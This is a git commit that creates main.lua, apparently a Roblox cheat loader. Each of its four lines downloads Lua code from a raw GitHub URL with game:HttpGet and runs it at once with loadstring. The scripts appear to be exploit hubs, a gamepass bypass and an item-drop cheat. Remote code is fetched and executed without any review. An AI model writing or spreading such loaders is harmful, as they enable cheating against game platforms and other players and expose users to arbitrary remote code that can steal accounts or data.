dcb949d3da6f866bedd94f893ba14e9839a77936
KuatanosDev <parpikuat@gmail.com>
2025-03-12 10:14:40 +0500

    Create main.lua

---
+++ main.lua
@@ -0,0 +1,4 @@
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/Dan41/Scripts/main/%5BCHAOS%5D%20CHAOTIC%20HUB.lua'),true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/H20CalibreYT/SystemBroken/main/script"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KuatanosDev/CHAOS-Gamepass-code/refs/heads/main/code"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KuatanosDev/Rtodropitemrblx/refs/heads/main/code.lua"))()
